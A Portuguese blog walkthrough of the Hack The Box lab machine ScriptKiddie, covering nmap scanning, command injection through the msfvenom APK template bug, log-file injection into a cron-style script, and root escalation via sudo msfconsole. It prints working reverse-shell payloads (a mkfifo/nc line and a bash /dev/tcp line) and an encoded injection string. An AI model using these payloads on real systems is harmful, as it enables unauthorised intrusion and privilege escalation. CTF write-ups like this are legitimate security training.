---
layout: single
title: "Hackthebox write-up: ScriptKiddie"
namespace: htb-scriptkiddie
category: Writeup
tags: HackTheBox htb-easy htb-linux
date: 2021-06-05 16:00:00
header:
   teaser: https://i.imgur.com/wHnMfBz.png
---

Olá pessoal!

A máquina desta semana será **ScriptKiddie**, outra máquina Linux classificada como fácil do [Hack The Box](https://www.hackthebox.eu), criada por [0xdf](https://app.hackthebox.eu/users/4935).<!--more-->

:information_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas
{: .notice--info}

![ScriptKiddie](https://i.imgur.com/W5wv9JE.png){: .align-center}

## Enumeração

Como de costume, iniciado enumeração com um scan rápido do `nmap` para verificar os serviços publicados nesta máquina.

```bash
$ nmap -sC -sV -Pn -oA quick 10.10.10.226                                                                   

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-24 14:05 -03
Nmap scan report for 10.10.10.226
Host is up (0.077s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.94 seconds
```

### 5000/TCP - Serviço HTTP

Ao acessar a página notado algumas ferramentas a serem utilizadas por algum script kiddie como executar um scan utilizando o `nmap`, criar um payload no `msfvenom` e buscar por exploits utilizando o `searchsploit`.

Tentei diversas formas de injeção de código neste formulário, inclusive tentando algo automatizado como por exemplo a ferramenta [commixproject/commix](https://github.com/commixproject/commix) que encontrei no Github, porém sem sucesso desta vez.

Buscando por vulnerabilidades nas ferramentas utilizadas pela página (`nmap`, `msfvenom`, `searchsploit`), acabei encontrando uma relacionada ao `msfvenom`, conforme abaixo:

```bash
$ searchsploit msfvenom
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
Metasploit Framework 6.0.11 - msfvenom APK template command injection | multiple/local/49491.py
---------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

## Aceso inicial e User flag

Alterado arquivo python com o payload desejado `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f`, encontrei alguns erros durante a execução do binário `keytool`, uma vez que este tenta assinar um arquivo APK com o payload no Common Name mas, uma vez que existia um caracter `+` no conteúdo codificado em base64 na primeira iteração, precisei modificá-lo para codificá-lo novamente, gerando um payload desta vez com sucesso a ser enviado na ferramenta e utilizado na exploração da vulnerabilidade no portal:

```python
# Change me
payload = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f'

# b64encode to avoid badchars (keytool is picky)
payload_b64 = b64encode(payload.encode()).decode()
if '+' in payload_b64:
    payload_b64 = b64encode(payload_b64.encode()).decode()
    decode = '| base64 -d | base64 -d'
else:
    decode = '| base64 -d'

dname = f"CN='|echo -n {payload_b64} {decode} | sh #"
```

Abaixo podemos ver o output da criação do payload gerado, no caso o arquivo `evil.apk`

```bash
$ python3 49491.py                                                                                                               
[+] Manufacturing evil apkfile
Payload: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f
-dname: CN='|echo -n Y20wZ0wzUnRjQzltTzIxclptbG1ieUF2ZEcxd0wyWTdZMkYwSUM5MGJYQXZabnd2WW1sdUwzTm9JQzFwSURJK0pqRjhibU1nTVRBdU1UQXVNVFF1TVRNMklEUTBORE1nUGk5MGJYQXZaZz09 | base64 -d | base64 -d | sh #

  adding: empty (stored 0%)
jar signed.

Warning:
The signer's certificate is self-signed.
The SHA1 algorithm specified for the -digestalg option is considered a security risk. This algorithm will be disabled in a future update.
The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk. This algorithm will be disabled in a future update.
POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.

[+] Done! apkfile is at /tmp/tmpt7qr4ner/evil.apk
Do: msfvenom -x /tmp/tmpt7qr4ner/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null
```

Após gerado o arquivo APK contendo o payload, executado um request no portal com os dados sugeridos no final da execução do script anterior, apontando para o LHOST 127.0.0.1 e selecionando o tipo de payload android, que deverá ser traduzido para o payload `android/meterpreter/reverse_tcp`.

![Submiting the evil payload](https://i.imgur.com/hWgxfFw.png){: .align-center}

Após clicar no botão **Generate**, um shell reverso foi retornado no listener inicializado previamente conforme especificado durante a criação do payload.

![reverse shell returned](https://i.imgur.com/VAYnB2r.png){: .align-center}

Nesta mesma sessão obtida, com as credenciais em que o aplicativo se encontrava em execução, no caso o usuário `kid`, foi possível obter a flag de usuário.

```bash
kid@scriptkiddie:~$ id
uid=1000(kid) gid=1000(kid) groups=1000(kid)
kid@scriptkiddie:~$ cat /home/kid/user.txt
<redacted>
```

## Root flag

Depois de executar o `linenum.sh`, notado que existe outro usuário na máquina, `pwn`, e que tínhamos direito de leitura em seu perfil de diretório, o qual continha um arquivo chamado `scanloosers.sh` com o seguinte conteúdo:

```bash
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

Uma vez que este script lê o conteúdo de um arquivo localizado no perfil do usuário `kid` (`/home/kid/logs/hackers`), editado seu conteúdo com o valor abaixo, de modo que fosse possível injetar o código necessário para a obtenção de um novo shell reverso com a conta `pwn`, que aparentemente executaria este script de forma recorrente.

```bash
echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' #" > ~/logs/hackers
```

Após definir o novo listener e alterar o arquivo `hackers`, um novo shell reverso foi retornado, desta vez com a conta `pwn` :smile:

Enumerando novamente a máquina, desta vez a partir da conta deste novo usuário utilizando o `linpeas.sh`, notei que este user possuía direitos de execução do `msfconsole` de modo privilegiado.

```output
[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```

Ao instanciar a console utilizando o `sudo`, pude executar comandos normalmente utilizando o privilégio de `root`, podendo assim ler o arquivo `/root/root.txt` e obter a flag final desta máquina

```bash
pwn@scriptkiddie:~$ sudo /opt/metasploit-framework-6.0.9/msfconsole -q
msf6 > id
[*] exec: id

uid=0(root) gid=0(root) groups=0(root)
msf6 > cat /root/root.txt
[*] exec: cat /root/root.txt

<redacted>
msf6 >
```

Espero que tenham gostado!

Nos vemos no próximo post :smiley:
